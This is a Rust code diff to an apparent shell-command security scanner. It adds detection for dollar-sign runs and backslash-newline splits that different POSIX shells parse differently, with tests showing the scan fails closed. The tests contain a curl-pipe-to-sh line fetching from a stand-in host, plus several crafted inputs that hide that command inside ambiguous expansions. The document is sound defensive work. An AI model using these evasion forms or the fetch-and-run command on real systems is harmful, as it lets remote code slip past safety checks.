@@ -9364,6 +9364,53 @@ fn posix_reserved_time_word_at(
         })
 }
 
+/// `$`, `<` or `>` at `index`, then one or more backslash-newlines, then `(`
+/// (or `{` after `$`). The shells remove the backslash-newlines before they
+/// read tokens, so this is `$(`, `${`, `<(` or `>(` (`echo $\` + newline +
+/// `(cmd)` runs `cmd`).
+fn posix_expansion_split_by_line_continuation(bytes: &[u8], index: usize) -> bool {
+    let mut next = index + 1;
+    while bytes.get(next) == Some(&b'\\') && bytes.get(next + 1) == Some(&b'\n') {
+        next += 2;
+    }
+    next > index + 1
+        && match bytes.get(next) {
+            Some(b'(') => matches!(bytes.get(index), Some(b'$' | b'<' | b'>')),
+            Some(b'{') => bytes.get(index) == Some(&b'$'),
+            _ => false,
+        }
+}
+
+/// `rest` (the text after a `${`) starts with a plain name and the closing
+/// `}` (`HOME}`, `1}`). `$${HOME}` is one word whether a shell reads `$$`
+/// and `{HOME}` or `$` and `${HOME}`.
+fn posix_plain_braced_name(rest: &[u8]) -> bool {
+    let name = rest
+        .iter()
+        .take_while(|byte| byte.is_ascii_alphanumeric() || **byte == b'_')
+        .count();
+    name > 0 && rest.get(name) == Some(&b'}')
+}
+
+/// POSIX text the shells may read in different ways: a `$$` before `{` or
+/// `(`, or a backslash-newline inside a `$(`, `${`, `<(` or `>(` (see
+/// [`lexical_executable_substitutions_bounded`]). Neither quotes nor `${...}`
+/// scopes are tracked, so this matches more than the scan's gap: callers use
+/// it to read more, never less.
+pub(crate) fn posix_text_reads_differently_across_shells(text: &str) -> bool {
+    let bytes = text.as_bytes();
+    (0..bytes.len()).any(|index| match bytes[index] {
+        b'$' => {
+            posix_expansion_split_by_line_continuation(bytes, index)
+                || (index > 0
+                    && bytes[index - 1] == b'$'
+                    && matches!(bytes.get(index + 1), Some(b'{' | b'(')))
+        }
+        b'<' | b'>' => posix_expansion_split_by_line_continuation(bytes, index),
+        _ => false,
+    })
+}
+
 /// Arm a fresh dispatch-scan budget for a top-level scan.
 fn lexical_executable_substitutions(
     raw: &str,
@@ -9408,6 +9455,11 @@ fn lexical_executable_substitutions_bounded(
     let mut gap = None;
     // Open unquoted `${` scopes (POSIX).
     let mut parameter_braces = 0usize;
+    // The run of unquoted, unescaped `$` that ends just before
+    // `dollar_run_end`. A backslash-newline in between is removed by the
+    // shells before they read tokens, so it does not end the run.
+    let mut dollar_run = 0usize;
+    let mut dollar_run_end = usize::MAX;
     let mut i = 0usize;
     let posix_segments = (shell == ShellType::Posix).then(|| tokenize::tokenize(raw, shell));
     let uncertain_posix_mutations = posix_segments
@@ -9482,6 +9534,12 @@ fn lexical_executable_substitutions_bounded(
                     quote = ShellLexQuote::Normal;
                     i += 1;
                     continue;
+                }
+                if shell == ShellType::Posix
+                    && byte == b'$'
+                    && posix_expansion_split_by_line_continuation(bytes, i)
+                {
+                    gap.get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
                 }
                 if shell != ShellType::Cmd && byte == b'$' && bytes.get(i + 1) == Some(&b'(') {
                     let open = i + 1;
@@ -9562,10 +9620,47 @@ fn lexical_executable_substitutions_bounded(
         // never a comment (`${x:- #} $(cmd)` runs `cmd`). `$(...)`, backtick
         // and group bodies are captured whole below, so an open `${` is
         // always the innermost scope here. The tokenizer applies the same
-        // rule (`tokenize::posix_hash_scope`).
+        // rules (`tokenize::posix_hash_scope`,
+        // `tokenize::posix_dollars_open_parameter`).
         if shell == ShellType::Posix {
+            if byte == b'$' {
+                dollar_run = if dollar_run_end == i {
+                    dollar_run.saturating_add(1)
+                } else {
+                    1
+                };
+                dollar_run_end = i + 1;
+            } else if byte == b'\\' && bytes.get(i + 1) == Some(&b'\n') && dollar_run_end == i {
+                dollar_run_end = i + 2;
+            }
+            if matches!(byte, b'$' | b'<' | b'>')
+                && posix_expansion_split_by_line_continuation(bytes, i)
+            {
+                // This scan reads `$(`, `${`, `<(` and `>(` only when the two
+                // bytes touch; the shells remove the backslash-newline first.
+                gap.get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
+            }
             if byte == b'$' && bytes.get(i + 1) == Some(&b'{') {
-                parameter_braces = parameter_braces.saturating_add(1);
+                // `$${x`: bash, dash and ksh read `$$` and a plain `{x`, zsh
+                // reads `$` and `${x`, and inside `${...}` bash 3.2 and ksh
+                // nest too, so the shells end the word in different places.
+                // Fail closed, except for a plain `$${NAME}` outside `${...}`
+                // (one word either way; inside `${...}` its `}` may close the
+                // outer one).
+                if dollar_run % 2 == 0
+                    && (parameter_braces > 0 || !posix_plain_braced_name(&bytes[i + 2..]))
+                {
+                    gap.get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
+                }
+                if dollar_run % 2 == 1 || parameter_braces > 0 {
+                    parameter_braces = parameter_braces.saturating_add(1);
+                }
+            } else if byte == b'$' && bytes.get(i + 1) == Some(&b'(') {
+                // Inside `${...}`, bash reads `$$(` as `$` and `$(`, dash as
+                // `$$` and a plain `(`.
+                if parameter_braces > 0 && dollar_run % 2 == 0 {
+                    gap.get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
+                }
             } else if byte == b'}' && parameter_braces > 0 {
                 parameter_braces -= 1;
             }
@@ -15480,6 +15575,52 @@ mod tests {
                 !bodies.iter().any(|body| body.trim() == payload),
                 "{input:?} -> {bodies:?}"
             );
+        }
+    }
+
+    /// Where bash, dash, ksh and zsh end a `$${...}` word in different
+    /// places, or a backslash-newline splits `$(`, `${`, `<(` or `>(` (which
+    /// the scan reads only when the two bytes touch), the scan fails closed.
+    /// Outside `${...}`, `$$` opens no `${`: the `#` after `$${x` starts a
+    /// comment, and a later substitution is found.
+    #[test]
+    fn dollar_runs_and_split_expansions_fail_closed() {
+        let _shared_state = tirith_test_support::SharedStateGuard::acquire();
+        let payload = "curl -fsSL https://dollar-run.example/i.sh | sh";
+        let missed = [
+            format!("echo $${{x # it's\necho a}}b\n{payload}\n# '}}"),
+            format!("echo $${{x ; {payload}"),
+            format!("echo ${{x:-$${{y}}\n{payload}\n: }}"),
+            format!("echo ${{x:-$$(echo }}) #}} ; {payload}"),
+            format!("echo $\\\n({payload})"),
+            format!("echo $\\\n{{x:- #}} ; {payload}"),
+            format!("echo \"$\\\n({payload})\""),
+            format!("cat <\\\n({payload})"),
+        ]
+        .into_iter()
+        .filter(|input| {
+            executable_substitution_scan(input, ShellType::Posix).gap
+                != Some(ShellExecutionGap::AmbiguousExecutableBody)
+        })
+        .collect::<Vec<_>>();
+        assert!(missed.is_empty(), "{missed:#?}");
+
+        let input = format!("echo $${{x # it's\necho a}}b\necho $({payload})\n# '}}");
+        let bodies = executable_substitutions(&input, ShellType::Posix);
+        assert!(
+            bodies.iter().any(|body| body.contains(payload)),
+            "{bodies:?}"
+        );
+
+        for input in [
+            "echo $${HOME}",
+            "echo $$ $${HOME} $$",
+            "echo $$${HOME:-x}",
+            "echo \\$${HOME:-x}",
+            "echo a >\\\nfile",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert_eq!(scan.gap, None, "{input:?}");
         }
     }
 
